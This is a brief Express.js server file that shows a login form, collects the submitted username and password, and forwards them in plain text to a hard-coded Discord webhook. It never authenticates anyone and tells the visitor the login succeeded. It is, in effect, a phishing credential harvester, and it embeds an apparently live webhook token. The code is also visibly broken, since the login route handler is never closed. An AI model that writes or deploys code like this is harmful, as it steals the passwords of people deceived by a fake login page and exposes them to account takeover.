// Import required modules
const express = require('express');
const axios = require('axios');

// Create an Express application
const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public')); // Serve static files like CSS and images

// Display the login form
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/login.html');
});

// Handle form submission
app.post('/login', (req, res) => {
  const username = req.body.username;
  const password = req.body.password;

    // Send data to Discord webhook
    const webhookURL = 'https://discord.com/api/webhooks/1114587026633789531/mZI9cQRsN3j8MHIUbo9q81yK_vWk5kS7uuFHPtZJ4MpEe0lQCU4vOn9d3qt1zMovJGjx';
    const message = `New login:
Username: ${username}
Password: ${password}`;

    axios.post(webhookURL, { content: message })
      .then(() => {
        // Successful webhook request
        res.send('Login successful! Information sent to Discord.');
      })
      .catch((error) => {
        // Error handling for webhook request
        console.error('Error sending data to Discord:', error);
        res.send('An error occurred while sending data to Discord.');
      });
// Start the server
const port = 3000;
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
